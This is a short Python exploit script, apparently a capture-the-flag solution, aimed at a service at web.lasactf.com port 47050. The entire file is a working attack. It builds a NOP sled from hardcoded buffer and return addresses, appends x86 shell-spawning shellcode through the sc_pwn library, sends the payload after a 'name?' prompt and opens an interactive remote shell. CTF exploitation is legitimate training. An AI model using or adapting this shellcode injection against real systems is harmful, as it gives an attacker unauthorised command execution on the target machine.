#!/usr/bin/env python
from sc_pwn import *

#target     = {'host':'192.168.75.129','port':8080}
target     = {'host':'web.lasactf.com','port':47050}

addr_buf    = 0x080480c2
addr_ret    = 0x080480f6

#==========
def attack(cmn):
    sc = ShellCode('x86') 
    exploit  = '\x90'*(addr_ret-addr_buf)
    exploit += sc.sh()

    cmn.read_until('name?\n')
    cmn.sendln(exploit)


#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='RAW')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
